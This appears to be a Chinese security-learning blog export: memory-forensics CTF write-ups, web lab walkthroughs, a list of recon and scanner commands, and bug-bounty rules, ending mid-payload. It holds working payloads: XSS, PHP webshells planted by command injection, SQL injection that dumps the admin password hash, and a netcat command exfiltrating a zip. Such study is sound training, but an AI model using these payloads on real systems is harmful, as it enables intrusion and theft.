我们之所以获取瑞克电脑的内存转储，是因为它感染了恶意软件。请找出恶意软件的进程名（包含扩展名）。 恶意软件是如何进入瑞克电脑的？这很可能与瑞克过去的某个非法习惯有关……（可以结合《瑞克和莫蒂》的剧情来推测） 继续追踪恶意软件的入侵途径。 我们确认这个恶意软件是勒索软件。请找到攻击者的比特币地址。 恶意软件的图形界面有些可疑之处。 瑞克必须恢复他的文件！请问用于加密文件的随机密码是什么？ 既然你已经从内存中提取出了密码，现在能解密瑞克的文件了吗？ 解析：\n执行volatility -f OtterCTF.vmem --profile=Win7SP1x64 hashdumps得到： 1 Rick:1000:aad3b435b51404eeaad3b435b51404ee:518172d012f97d3a8fcc089615283940::: netscan\n发现192.168.202.131为电脑ip地址\nhivelist 查看注册表\n发现0xfffff8a000024010 0x000000002d50c010 \\REGISTRY\\MACHINE\\SYSTEM 0xfffff8a000024010是这个注册表的虚拟地址\n-o 0xfffff8a000024010 printkey 查看注册表中的key\n-o 0xfffff8a000024010 -K \u0026quot;ControlSet001\u0026quot; printkey 查看subkey中的值\n最终经过层层查看，执行：\n1 volatility -f OtterCTF.vmem --profile=Win7SP1x64 -o 0xfffff8a000024010 -K \u0026#34;ControlSet001\\Control\\ComputerName\\ComputerName\u0026#34; printkey 后终于拿到计算机名：WIN-LO6FAF3DTFE\nnetscan\n发现LunarMS.exe，连接到的服务器IP为77.102.199.102\n导出LunarMS.exe的内存信息：\n1 volatility -f OtterCTF.vmem --profile=Win7SP1x64 memdump -p 708 -D .\\ 使用010 Editer等十六进制查看工具打开，搜索\u0026quot;Lunar-3\u0026quot;附近的内容\n因此账户名就是0tt3r8r33z3（没有理由，问就是玄学）\n同样是分析刚才的708.dmp，根据题目所给线索，我们拼出一个搜索内容：\n1 4006????????????????????????????????????5A0C0000 在010 Editer中搜索（记得在选项中打开“使用通配符搜索”）可得唯一结果：\n即游戏角色名为“M0rtyL0L”\n根据提示，我们使用命令查看剪贴板：\n1 volatility -f OtterCTF.vmem --profile=Win7SP1x64 clipboard 得到邮箱密码：M@il_Pr0vid0rs\n执行命令pstree 查看进程树：\n可疑，因为vmwware是虚拟机的进程，不应该出现在其他人的子进程中\n执行命令：cmdline -p 3720,3820判断两个进程的出生位置\n1 2 3 4 5 6 7 Volatility Foundation Volatility Framework 2.6 ************************************************************************ Rick And Morty pid: 3820 Command line : \u0026#34;C:\\Torrents\\Rick And Morty season 1 download.exe\u0026#34; ************************************************************************ vmware-tray.ex pid: 3720 Command line : \u0026#34;C:\\Users\\Rick\\AppData\\Local\\Temp\\RarSFX0\\vmware-tray.exe\u0026#34; ​\t看到vmware-tray.exe存在于临时目录中，确定确实是恶意软件。\nfilescan | grep -i \u0026quot;Rick and Morty\u0026quot; 发现在下载文件。：\n1 0x000000007d8813c0 2 0 RW-rwd \\Device\\HarddiskVolume1\\Users\\Rick\\Downloads\\Rick And Morty season 1 download.exe.torrent dumpfiles -Q 0000007dae9350 -D ./ 下载这个进程\nstrings file.None.0xfffffa801b42c9e0.dat 查看进程中所有的字符\n发现关键词M3an_T0rren7_4_R!cke\n因为目标使用chrome浏览器 filescan | grep -i \u0026quot;chrome.*history*\u0026quot;\n搜索chrome相关历史，导出第一个： dumpfiles -Q 0x000000007d45dcc0 -D ./\n发现下载了2个文件\nchrome浏览器使用sqlite数据库存储的\n使用sqlitestudio查看chrome数据（打开.dat文件），发现曾经访问@mail.com邮箱\n开始寻找邮箱账号\nstrings OtterCTF.vmem \u0026gt; outterctf.strings 内存转化为字符串\ngrep \u0026quot;@mail.com\u0026quot; outterctf.strings 在字符串中寻找关键词，找到邮箱rickopicko@mail.com\ngrep -A 20 \u0026quot;\u0026lt;rickopicko@mail.com\u0026gt;\u0026quot; outterctf.strings 搜索邮箱对应的邮件\n发现关键词Hum@n_I5_Th3_Weak3s7_Link_In_Th3_Ch@inYear\n发现目标btc地址\nfilescan | grep \u0026quot;Desktop\u0026quot; 搜查电脑桌面\n1 0x000000007d660500 2 0 -W-r-- \\Device\\HarddiskVolume1\\Users\\Rick\\Desktop\\READ_IT.txt 发现黑客留下的勒索信\ndumpfiles -Q 0x000000007d660500 -D ./ 阅读没发现什么\n把目标恶意软件3720进程下下来\nmemdump -p 3720 -D ./\nstrings -e l 3720.dmp | grep -i -A 5 \u0026quot;ransom\u0026quot;\n注意上面这条是Linux命令，不要拼接在volatility语句后面！\n搜索勒索方面的关键词看到btc地址1MmpEmebJkqXG8nQv4cjJSmxZQFVmFo63M\nprocdump -p 3720 -D ./ 把目标进程包装为exe格式\nbinwalk executable.3720.exe 查看恶意软件本尊中包含了什么 包含了图片，png格式\nforemost -t png executable.3720.exe 专门分解里面的图片出来，结果：\n继续分析刚才导出的3720.dmp\nstrings -e l 3720.dmp \u0026gt; 3720.dmp.strings 把恶意进程转化为字符串\ngrep \u0026quot;WIN-LO6FAF3DTFE\u0026quot; 3720.dmp.strings | wc -l\ngrep \u0026quot;WIN-LO6FAF3DTFE\u0026quot; 3720.dmp.strings | sort | uniq\n注意上面三条命令都是Linux自带命令，不要拼接在volatility语句后面！\n发现WIN-LO6FAF3DTFE-Rick aDOBofVYUNVnmp7\n恢复被加密的文件\nfilescan | grep -i \u0026quot;flag\u0026quot; 发现\n1 0x000000007e410890 16 0 R--r-- \\Device\\HarddiskVolume1\\Users\\Rick\\Desktop\\Flag.txt dumpfiles -Q 0x000000007e410890 -D ./\n改名为Flag.txt\n打开c32把下面所有00去掉，保存\n根据勒索软件的文件头搜索出来HiddenTear病毒，可以使用解密软件：https://pan.baidu.com/s/1HdaPg0w_Azr-foBGJsdNUA?pwd=x7j3\n将待解密文件放在单独文件夹，修改上面的Extension(后缀名)为.txt ，之后输入这个aDOBofVYUNVnmp7密码\n解密得CTF{Im_Th@_B3S7_RicK_0f_Th3m_4ll}\nL-xxx-xxx.raw (黑客行为取证) 题目（迫真情景）：\n一天下午小白出去吃饭，临走之前还不忘锁了电脑，这时同寝室的小黑想搞点事情，懂点黑客和社工知识的小黑经过多次尝试获得了密码成功进入电脑，于是便悄悄在电脑上动起手脚了，便在桌面上写着什么，想给小白一个惊喜，同时还传送着小白的机密文件，正巧这时小白刚好回来，两人都吓了一跳，小黑也不管自己在电脑上留下的操作急忙离开电脑，故作淡定的说：“我就是随便看看”。\n小黑发送的机密文件里面到底是什么，据说是flag？\n小黑写的啥 ？\n那么问题来了，小白的密码是啥？\n解析：\ncmdscan\n发现执行过以下命令： nc 192.168.57.14 2333 \u0026lt; P@ssW0rd_is_y0ur_bir7hd4y.zip\n查找文件：\nfilescan | grep P@ssW0rd_is_y0ur_bir7hd4y.zip\n1 0x0000000002c61318 3 1 R--rw- \\Device\\HarddiskVolume1\\Program Files\\Netcat\\P@ssW0rd_is_y0ur_bir7hd4y.zip 导出文件：\ndumpfiles -Q 0x0000000002c61318 -D ./\n发现2个文件，哪个文件改为.zip能用就用哪个\n破解zip的密码，可使用ARCHPR软件，位置在C:\\tools\\alltools\\密码破解\\rar密码破解-ARCHPR.zip自行安装\n最终密码是19950101（爆不出来就是设置原因，例如是否勾选所有数字？密码长度是否足够？）\n发现flag\nnotepad 看到记事本内容：\n666C61677B57336C6563306D655F376F5F466F72336E356963737D\nhashdump\nxp-sp3.raw (行为分析取证) 题目： 获取记事本和图片的信息\n1 2 3 4 5 6 7 8 9 volatility -f xp_sp3.raw imageinfo volatility -f xp_sp3.raw --profile=WinXPSP2x86 pslist notepad 记事本里的内容为20211209(encrypt) volatility -f xp_sp3.raw --profile=WinXPSP2x86 filescan | grep flag 导出文件 volatility -f xp_sp3.raw --profile=WinXPSP2x86 dumpfiles -Q 0x0000000001e65028 -D ./\n图片里有字符串提示：FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]\n实际上原题的加密算法在flag.zip中，需要我们导出并用之前记事本里看到的密码解压查看，这里就直接给出解密脚本了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 s = list(b\u0026#39;FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]\u0026#39;) t = \u0026#39;\u0026#39; def encrypt(x): if x \u0026gt;= ord(\u0026#39;a\u0026#39;) and x \u0026lt;= ord(\u0026#39;w\u0026#39;): x += 3 elif x == ord(\u0026#39;x\u0026#39;): x = ord(\u0026#39;a\u0026#39;) elif x == ord(\u0026#39;y\u0026#39;): x = ord(\u0026#39;b\u0026#39;) elif x == ord(\u0026#39;z\u0026#39;): x = ord(\u0026#39;c\u0026#39;) elif x == ord(\u0026#39;_\u0026#39;): x = ord(\u0026#39;|\u0026#39;) x -= 32 return x for i in range(len(s)): for j in range(128): if encrypt(j) == s[i]: t += chr(j) break else: t += \u0026#39;?\u0026#39; print(t) # cazy{Xian?will?certainly?succeed?in?fighting?the?epidemic} 把?替换成_：cazy{Xian_will_certainly_succeed_in_fighting_the_epidemic}\n西安一定会战胜疫情\nTarget.vmem (pc和手机取证) 题目： 获取密码信息和手机信息\n解析：\nvolatility -f Target.vmem imageinfo\nvolatility -f Target.vmem --profile=Win7SP1x64 lsadump 发现密码\nfilescan | grep CTF 文件查找\n1 0x000000007e164cc0 12 0 R--r-- \\Device\\HarddiskVolume1\\Users\\CTF\\Desktop\\HUAWEI P40_2021-aa-bb xx.yy.zz.exe filescan | grep HUAWEI 查找华为信息\n1 0x000000007fe72430 2 0 -W-r-- \\Device\\HarddiskVolume1\\Users\\CTF\\Desktop\\HUAWEI P40_2021-aa-bb xx.yy.zz\\picture\\storage\\MediaTar\\images\\images0.tar.enc 导出文件dumpfiles -Q 0x000000007fe72430 -D ./\n在GitHub上寻找工具对目标型号华为进行破解\nmem.dump (磁盘加密取证) 题目： 打开mem.dump内存，里面有使用CnCrypt加密软件加密的内容，请破解挂载后取证\n解析：\nvolatility -f mem.dump imageinfo\nvolatility -f mem.dump --profile=Win7SP1x64 pslist 发现 CnCrypt.exe\nvolatility -f mem.dump --profile=Win7SP1x64 filescan | grep flag 搜索flag文件位置\n导出文件dumpfiles -Q 0x000000003e435890 -D ./\nvolatility -f mem.dump --profile=Win7SP1x64 cmdscan 发现提示，ccx的密码和管理员密码一样\nvolatility -f mem.dump --profile=Win7SP1x64 hashdump\n发现密码，使用解密平台解密：ABCabc123\nCnCrypt_v1.29挂载加密卷（C:\\tools\\alltools\\数字取证win工具）\n打开加密卷中的文件得到flag：flag{now_you_see_my_secret}\n","date":"2026-02-02T18:14:46+08:00","permalink":"https://www.retr0.xyz/p/2.2-%E6%95%B0%E5%AD%97%E5%8F%96%E8%AF%81/","title":"2.2 数字取证"},{"content":"XSS注入 http://chanzhi7.njhack.xyz/www/\n尝试搜索一些内容，在F12中使用Ctrl+F看看搜索的关键词出现在了网页源代码的哪些位置。\n1 \u0026lt;input type=\u0026#39;text\u0026#39; name=\u0026#39;words\u0026#39; id=\u0026#39;words\u0026#39; value=\u0026#39;haha\u0026#39; class=\u0026#39;form-control\u0026#39; placeholder=\u0026#39;\u0026#39; /\u0026gt; 直接尝试注入\n1 \u0026lt;input type=\u0026#39;text\u0026#39; name=\u0026#39;words\u0026#39; id=\u0026#39;words\u0026#39; value=\u0026#39; abc\u0026#39;\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026lt;img \u0026#39; \u0026#39; class=\u0026#39;form-control\u0026#39; placeholder=\u0026#39;\u0026#39; /\u0026gt; 被拦截\n尝试二阶URL编码，发现可以逃逸闭合，并且网站并没有拦截\n1 \u0026lt;input type=\u0026#39;text\u0026#39; name=\u0026#39;words\u0026#39; id=\u0026#39;words\u0026#39; value=\u0026#39; abc\u0026#39;\u0026gt;\u0026lt;img \u0026#39; \u0026#39; class=\u0026#39;form-control\u0026#39; placeholder=\u0026#39;\u0026#39; /\u0026gt; Payload1：\n1 \u0026lt;input type=\u0026#39;text\u0026#39; name=\u0026#39;words\u0026#39; id=\u0026#39;words\u0026#39; value=\u0026#39; abc\u0026#39; onmouseover=\u0026#39;alert(1) \u0026#39; class=\u0026#39;form-control\u0026#39; placeholder=\u0026#39;\u0026#39; /\u0026gt; Payload2（思考）：\n直接使用\u0026lt;script\u0026gt;\u0026lt;/script\u0026gt;格式的注入发现编码两次也被拦截，\n解决方案：那么单独对\u0026lt;script\u0026gt;\u0026lt;/script\u0026gt;再编码一次\n文件包含-1 该靶场包含三个文件：\nindex.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php $a = $_GET[\u0026#39;page\u0026#39;]; if(stristr($a,\u0026#39;php://\u0026#39;)){ die(\u0026#34;stop hacking\u0026#34;); } if(stristr($a,\u0026#39;data://\u0026#39;)){ die(\u0026#34;stop hacking\u0026#34;); } if(!isset($a)){ include \u0026#39;page1.php\u0026#39;; }else{ include $a; } ?\u0026gt; page1.php 1 \u0026lt;?php echo \u0026#34;this is page1\u0026#34;;?\u0026gt; win.key 1 success! 目标： 在网页中查看到win.key的内容\n解析： 参数直接填?page=win.key即可\n文件包含-2 访问：http://fileinclude1.njhack.xyz/#/\n解析： 看到URL中默认是包含了一个view.html，我们尝试直接访问一下这个页面并查看其源代码。\n1 2 3 4 5 6 7 8 9 \u0026lt;?php @$a = $_POST[\u0026#39;Hello\u0026#39;]; if(isset($a)){ @preg_replace(\u0026#34;/\\[(.*)\\]/e\u0026#34;,\u0026#39;\\\\1\u0026#39;,base64_decode(\u0026#39;W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=\u0026#39;)); } ?\u0026gt; Hello \u0026lt;br\u0026gt; Are you ok? base64处的内容解码为：[@eval(base64_decode($_POST[z0]));]，这说明此处实际上存在一个一句话木马，调用该木马的方法是传入任意Hello参数，同时传入z0一个base64编码后的待执行命令。\n这里我们为z0传入一个system($_POST[\u0026quot;cmd\u0026quot;])的系统级一句话木马，这样我们快就可以通过追加一个参数cmd直接执行系统级命令，例如ls、cat。\n所以我们POST以下内容：\n1 Hello=1\u0026amp;z0=c3lzdGVtKCRfUE9TVFsnY21kJ10pOw==\u0026amp;cmd=ls ../\t后面的退回上一级是测试出来的 可以看到列出的文件的确有key.php\n因此我们继续传入：\n1 Hello=1\u0026amp;z0=c3lzdGVtKCRfUE9TVFsnY21kJ10pOw==\u0026amp;cmd=cat ../key.php 成功拿到目标数据。\n文件包含-3 访问：http://fileinclude2.njhack.xyz/#/\n解析：\n这次的view.html中就没有什么一句话木马了，我们使用php伪协议之filter来读取，修改file参数为\n1 http://fileinclude2.njhack.xyz/vulnerabilities/fu1.php?file=php://filter/read=convert.base64-encode/resource=../key.php 其中到上一级目录同样是测试出来的，看到返回了这样一串字符串：\n1 R2V0IGl0IQ0KPD9waHANCg0KLy9rZXk6NnUzeDl0MnANCj8+ 使用base64解码得：\n1 2 3 4 5 Get it! \u0026lt;?php //key:6u3x9t2p ?\u0026gt; 命令执行-1 在phpstudy中自行搭建：\n1 2 3 4 5 6 7 8 \u0026lt;?php $a = $_GET[\u0026#39;a\u0026#39;]; eval(\u0026#34;\\$o=strtolower(\\\u0026#34;$a\\\u0026#34;);\u0026#34;); echo $o; show_source(__FILE__); ?\u0026gt; 解析：\n可以看到源代码的含义是将传入的参数值全部转为小写并且print一遍，这里的主要思路是逃逸闭合，为了方便，这一过程应在本地的记事本中进行，把eval那行代码复制到记事本中，尝试逃逸闭合：\n1 eval(\u0026#34;\\$o=strtolower(\\\u0026#34; x\\\u0026#34;);\u0026#34;);system($_GET[\u0026#34;cmd\u0026#34;]);//\t\\\u0026#34;);\u0026#34;); 因此我们只需传入参数：a=x\\\u0026quot;);\u0026quot;);system($_GET[\u0026quot;cmd\u0026quot;]);///\u0026amp;cmd=系统命令\n不过受限于Windows环境，这里我们知道思路即可。\n命令执行-2 访问：http://exec1.njhack.xyz/#/\n解析：\n测试发现\u0026amp;没有被过滤，因此我们使用\u0026amp;拼接命令\n1 2 127.0.0.1 \u0026amp; l\u0026#39;s ../\t在此处发现了目标key.php 127.0.0.1 \u0026amp; c\u0026#39;a\u0026#39;t ../key.ph*\t此处发现php可能是敏感词，故设法绕过 代码审计 访问：http://dmsj1.njhack.xyz/#/\n解析： 思路一： 看到页面上展示的源代码是获取传入的cmd参数并使用exec执行，并且多余传入参数值有长度限制，可惜exec并不会直接输出代码执行的结果。\n1 2 3 4 5 6 echo \u0026#39;\u0026lt;?php \u0026#39; \u0026gt;\u0026gt; test.php echo \u0026#39;eval(\\c\u0026#39; \u0026gt;\u0026gt; test.php echo \u0026#39;$_PO\\c\u0026#39; \u0026gt;\u0026gt; test.php echo \u0026#39;ST[\\c\u0026#39; \u0026gt;\u0026gt; test.php echo \u0026#39;z0])\\c\u0026#39; \u0026gt;\u0026gt; test.php echo \u0026#39;?\u0026gt;\\c\u0026#39; \u0026gt;\u0026gt; test.php 至此我们已经在当前目录创建了一个php文件并且陆续向其中写入了一句话木马（参数z0）。\n思路二： 直接传入参数：\n?cmd=ls ../ \u0026gt;\u0026gt; a.html 接下来直接访问a.html这个文件就好啦。\n反序列化 自行部署：\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php error_reporting(0); $PTE = \u0026#34;CISP-PTE\u0026#34;; $str = $_GET[\u0026#39;str\u0026#39;]; if(unserialize($str)===\u0026#34;$PTE\u0026#34;){ echo \u0026#34;key is xxxxxx\u0026#34;; } show_source(__FILE__); ?\u0026gt; 解析：\n和之情一样，既然题目要求我们反序列化的结果要和$PTE这个参数值一致，那么我们直接修改源代码在在下面加一行看看它序列化之后长什么样子就行了。\n因此我们传参：?str=s:8:\u0026quot;CISP-PTE\u0026quot;;\nsql注入之insert注入 靶场文件：https://pan.baidu.com/s/1xAO7Eu9_Tc0pUfiiQaUkww?pwd=7ys3\n将靶场部署到phpstudy后导入sql文件到数据库的2web库中\n解析：\n查看源代码发现我们填写的参数插入后接下来便会被查询出来，所以我们考虑直接插入一个查询（select）语句，题目要求在author处进行注入，我们首先逃逸闭合，仿照原来的语句补全一组插入内容，然后在后面新增一组插入值，里面填写我们真正想要填写的内容\n要注意的是因为最终还是要与原语句凭借闭合，所以在第二组插入值中应该修改前两个值来进行注入，因为第三个无论如何最后都会被引号包裹而无法逃逸。\n最终Payload:\n1 2 3 4 5 6 7 x\u0026#39;,\u0026#39;123\u0026#39;),(\u0026#39;tt1\u0026#39;,database(),\u0026#39;nihao\tx\u0026#39;,\u0026#39;123\u0026#39;),(\u0026#39;tt1\u0026#39;,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=\u0026#39;2web\u0026#39;),\u0026#39;nihao\tx\u0026#39;,\u0026#39;123\u0026#39;),(\u0026#39;tt1\u0026#39;,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=\u0026#39;2web\u0026#39;/**/and/**/table_name=\u0026#39;users1\u0026#39;),\u0026#39;nihao x\u0026#39;,\u0026#39;123\u0026#39;),((select/**/group_concat(username)/**/from/**/users1),(select/**/group_concat(password)/**/from/**/users1),\u0026#39;nihao ","date":"2026-02-01T19:33:01+08:00","permalink":"https://www.retr0.xyz/p/2.1-%E7%BB%BC%E5%90%88%E7%BB%83%E4%B9%A0/","title":"2.1 综合练习"},{"content":" 信息搜集都是挖漏洞的前置工作，信息搜集越充分对后续挖漏洞越有利\nsubfinder搜集子域名 查找一些简单命令写法\nsubfinder.exe -h\n查找某个网站的所有子域名\nsubfinder.exe -d nba.com（查找nba.com网站所有子域名）\u0026mdash;\u0026mdash;但是此方法容易被发现\n用代理查找某个网站的子域名\nsubfinder.exe -d nba.com -proxy http://xx.x.x.x:8080\n筛选查找，subfinder.exe -dL list.txt -f exclude.txt -m match.txt -o output.txt\n创建文件list.txt：存放所有你找到的网站\n创建文件exclude.txt：存放不需要查找域名的网站\n创建match.txt： 用来指定一个包含关键词 / 正则表达式的文件\n创建output.txt：结果输出到最后的文件夹里面\n需要判断哪些域名是活的（可以访问）\n将httpx里面的httpx.exe拖进subfinder文件夹\nhttpx和subfinder一起配合工作\nsubfinder -d nba.com | ./httpx -o hack.html -html -title\nfofa 再导出查询的所有数据\n后续可以用httpx检查活性\n工具xray_windows_amd64.exe http://testphp.vulnweb.com 充满漏洞的网站，扫描这个网站\n基本用法1： 1 xray_windows_amd64.exe webscan --basic-crawler http://testphp.vulnweb.com/ --html-output xx.html 会将最后扫出来的结果放在xx.html（相当于渗透测试报告）\n基本用法2：burp和xray的联动 在xray目录底下打开cmd输入命令：\n1 xray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output burp.html 打开burpsuite添加监听端口：proxy settings\u0026ndash;network\u0026ndash;connections\u0026ndash;add\n如果以后不用就把勾去掉\n设置完burp后在打开一个网站\n在监听端口就能检测到网站的一些信息，然后你可以正常上网浏览此网站，xray会检测到一些网站可能存在的漏洞\n1 2 3 4 xray_windows_amd64.exe webscan --url http://192.168.119.129:9000 扫描 poc扫描出来 xray_windows_amd64.exe webscan --url http://192.168.149.130:9000 --poc ./minio.yaml xray_windows_amd64.exe -log-level debug webscan --url http://192.168.149.130:9000 --poc ./minio.yaml xray图形化界面的使用（不用记命令的方法） 在一键日卫星打开xray\n点击按钮选择，配置好\n如果要配合burp使用就选择被动监听端口，因为是流量传递给burp，burp再传递给你，你才可以扫描\n配置好后点击开始扫描就可以自动开始，结束会将结果以.html输出\nnuclei 利用yaml文件扫描漏洞的程序\n准备工作 nuclei.exe -update-templates\n单个目标\nnuclei.exe -target 192.168.119.129:9000\n（vulfocus）\n多个目标（批量） nuclei.exe -l list.txt\n创建list.txt在里面写你需要扫描的网站\nnuclei.exe -target 192.168.119.129 ：9000 -t ./minio/minio.yaml\n指定poc扫描\nnuclei.exe -target 192.168.149.130:9000 -t ./minio/\n指定批量poc扫描\nmatchers回包信息\nshiro\ntype:word\npart:header\nwords:remember me???\nnuclei-poc开发 开发环境：\nVscode+Yaml插件 https://code.visualstudio.com/\n开发文档参考资料：\nhttps://docs.nuclei.sh/template-guide/introduction\nhttps://blog.csdn.net/qq_41315957/article/details/126594572\nhttps://blog.csdn.net/qq_41315957/article/details/126594670\nPoc开发-Yaml语法\u0026amp;匹配提取 YAML是一种数据序列化语言，它的基本语法规则注意如下：\n大小写敏感 -使用缩进表示层级关系 -缩进时不允许使用Tab键，只允许使用空格。 缩进的空格数目不重要，只要相同层级的元素左侧对齐即可 Yaml Poc模版：\n编号 id 信息 info 请求 http file tcp等 匹配 matchers Interactsh 提取 extractors 开发流程：\npoc模版套用修改 poc创建独立编号 poc填入详细信息 poc提交协议流程编写 poc结果匹配模式判断 poc结果提取模式判断 案例1：CVE-2023-28432 （匹配结果）\nhttps://github.com/vulhub/vulhub/blob/master/minio/CVE-2023-28432/README.zh-cn.md\n使用docker-compose开启docker\n浏览器打开http://192.168.87.146:9001/可以访问 但是目标的api是在9000端口\nafrog 自带poc很少所以扫描出来很少\n1 2 afrog -t http://testphp.vulnweb.com/ -o vulnweb.html afrog -t http://testphp.vulnweb.com/ -P ./minio.yaml -o vulnweb.html fiora 为poc框架nuclei提供了图形界面，实现快速搜索、一键运行等功能\nCNVD-2017-02833 fastjson 1.2.47\nburp安装fiora插件 在history中，对该流量右键 send url to fiora 搜索fastjson 1.2.47，找到该条后右键run this poc\nnuclei -t C:\\Users\\Administrator\\nuclei-templates\\http\\vulnerabilities\\fastjson\\fastjson-1-2-47-rce.yaml -u http://192.168.213.129:55646/ -proxy http://127.0.0.1:8080\n注意：nuclei.exe复制到burp文件夹下\n资产搜集 优先攻子域名\nEhole Ehole_v0.0.1.exe finger -l 123.txt -json export.json\nrad rad -t http://4399.com\nrad_windows_amd64.exe -t http://4399.com -text 321.txt\n-t|--target|-u|--url 指定目标网址\n--text 以text形式输出\n--full 导出完整请求\n--http-proxy 添加代理\n--wait-login 网站中存在登陆时使用\n与xray联动\nrad_windows_amd64.exe -t http://vulnweb.com --http-proxy 127.0.0.1:7777\nxray_windows_amd64.exe webscan --listen 127.0.0.1:7777 --html-output 234.html\nvulmap python vulmap.py -u http://testphp.vulnweb.com\npython -m pip install -r requirements.txt\ndddd dddd64.exe -t 192.168.213.0/24 扫ip扫端口\ndddd64.exe -t http://192.168.213.129:43512/ 攻击网站\nghauri 1 2 3 4 5 6 7 8 python -m pip install -r requirements.txt python setup.py install ghauri -u \u0026#34;http://testphp.vulnweb.com/artists.php?artist=3\u0026#34; ghauri -u \u0026#34;http://testphp.vulnweb.com/artists.php?artist=3\u0026#34; --skip-urlencode --dbs ghauri -u \u0026#34;http://testphp.vulnweb.com/artists.php?artist=3\u0026#34; --skip-urlencode -D 库名 --tables ghauri -u \u0026#34;http://testphp.vulnweb.com/artists.php?artist=3\u0026#34; --skip-urlencode -D 库名 -T 表名 --culumns ghauri -u \u0026#34;http://testphp.vulnweb.com/artists.php?artist=3\u0026#34; --skip-urlencode -D 库名 -T 表名 -C 字段名 --dump ghauri -u \u0026#34;http://testphp.vulnweb.com/artists.php?artist=3\u0026#34; --skip-urlencode --sql-shell ","date":"2026-01-31T19:32:25+08:00","permalink":"https://www.retr0.xyz/p/1.31-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/","title":"1.31 信息搜集"},{"content":"挖洞规则（不是渗透） bug hunter vs pentest\n什么是SRC？\nSecurity Response Center 安全应急响应中心\n现在市面上存在了各种厂商的安全应急响应中心：https://www.anquanke.com/src/\n了解你所要提交的SRC平台规则和要求，不同的平台给出的评分标准不同。\n详细阅读测试范围，不要超出，会有非法测试的风险。\n遵循安全测试规范，比如sql注入会有要求，哪些东西不能读取，最多读取多少条。\n挖到数据库，只需要读取一两条证明。\n不要使用自动化工具，sqlmap（自动化软件有可能会造成不可预料的后果，比如删库） 条件允许测试越权漏洞，注册2个+账号，不要涉及在线用户。\n大多数厉害网站一般都会出现越权注销功能（很多短信轰炸）\n购物网站0元购或者积分，不会承认，让他发货，你再提交 xss漏洞，在线xss平台（不要用），自己搭建\n情报漏洞不要做： 某公司业务有漏洞可以删差评，有人进行出售，然后把出售截图提交给公司，公司核实之后支付报酬\n游戏外挂出售 电商信息出售 刷钻漏洞等 如果可以进而发现漏洞就可以提2次\n企业内鬼证据、bc网站不要碰（国内，除非你水平特别高）\n没有授权不要碰，某些奇怪的src不要碰 做一些大的src，挖洞项目，国外挖洞 bat，字节，美团。。。。。 教育src\n众测：\n（有钱） 漏洞盒子\u0026mdash;-金融\u0026mdash;\u0026ndash;养号\n补天众测\u0026mdash;-白帽子推荐/前300/挖到5个企业src高危/任意src平台年度top3 补天平台\u0026mdash;-专属src\u0026ndash;政府\n360众测（门票ctf注册资格，不一定一直有项目）\n火线平台（比较卷） 雷神众测\u0026mdash;-抢项目\u0026mdash;银行 cve cnvd 编号：（有漏洞变化） cnvd： 三大运营商，国企事业单位 通用性，资产大于等于5000w\n概念解释 越权 横向越权：同级权限跨越\n纵向越权：拿到不同级别的权限（如Admin）\n未授权：在没有做认证的情况下可以做认证后才能做的操作。\n支付漏洞 支付逻辑常见测试:\n熟悉常见支付流程 选择商品和数量-选择支付及配送方式-生成订单编号-订单支付选择-完成支付\n熟悉那些数据篡改 商品ID,购买价格,购买数量,订单属性,折扣属性,支付方式,支付状态等\n熟悉那些修改方式 替换支付,重复支付,最小额支付,负数支付,溢出支付,优惠券支付等\n熟悉那些另类方法 无限试用,越权支付,并发兑换,四舍五入半价购,循环利用优惠券,支付签约逻辑等\n靶场实操 安装metinfo这个cms作为靶场：https://pan.baidu.com/s/1NOOP_SuNqeyz2Ld3yQebmg?pwd=8grs\n越权 修改他人密码 横向/纵向越权：\n在修改自己密码时抓包，发现数据包中验证用户身份的只有userid这一个，因此我们尝试修改userid的内容为其他用户，甚至是admin，放包。尝试登录发现成功。\nTips： 在实操中成功修改admin密码后无法登录通常是因为管理员的登录页面和普通用户不一样。\n未授权：\n在修改自己密码时尝试把数据包中的cookie删除，发现密码同样可以删除成功。\n支付漏洞 安装easycms：https://pan.baidu.com/s/1a3po_LJ2NeWzDMreN3t2rQ?pwd=2uns\n在购买物品时抓包，发现数据包中并未有价格相关数据，但是又物品id和物品数量，推测网站数据库中将物品id和价格已经绑定。\n1 GET /index.php?case=archive\u0026amp;act=doorders\u0026amp;aid=83\u0026amp;datatype=\u0026amp;buy=true\u0026amp;thisnum=1 这里把thisnum的值为-100，发现价格变为负数，提交订单后订单显示支付成功，并且余额增加。\nsql注入 安装BESScms：https://pan.baidu.com/s/1YkAYFphFxb-_7Y4MGZrcbw?pwd=pnfr\n已知管理员登录界面可以进行sql注入，下面展示注入流程：\n1 2 3 4 5 6 7 8 9 10 11 admin\u0026#39;or (extractvalue(1,concat(0x7e,database(),0x7e)))#\t//besscms admin\u0026#39;or (extractvalue(1,concat(0x7e,(selselectect group_concat(table_name) fr from om information_schema.tables whe where re table_schema like database()),0x7e)))# //bees_admin,bees_admin_group,bee admin\u0026#39;or (extractvalue(1,concat(0x7e,(selselectect group_concat(column_name) fr from om information_schema.columns whe where re table_schema like database() a and nd table_name like \u0026#39;bees_admin\u0026#39;),0x7e)))# //id,admin_name,admin_password,ad admin\u0026#39;or (extractvalue(1,concat(0x7e,(selselectect group_concat(admin_name) fr from om bees_admin),0x7e)))# //admin admin\u0026#39;or (extractvalue(1,concat(0x7e,substr((selselectect group_concat(admin_password) fr from om bees_admin),1,15),0x7e)))# admin\u0026#39;or (extractvalue(1,concat(0x7e,substr((selselectect group_concat(admin_password) fr from om bees_admin),16,32),0x7e)))# //21232f297a57a5a743894a0e4a801fc3 我们甚至可以不满足于拿到管理员密码，我们尝试注入一句话木马：\n1 2 admin\u0026#39;un union ion selselectect 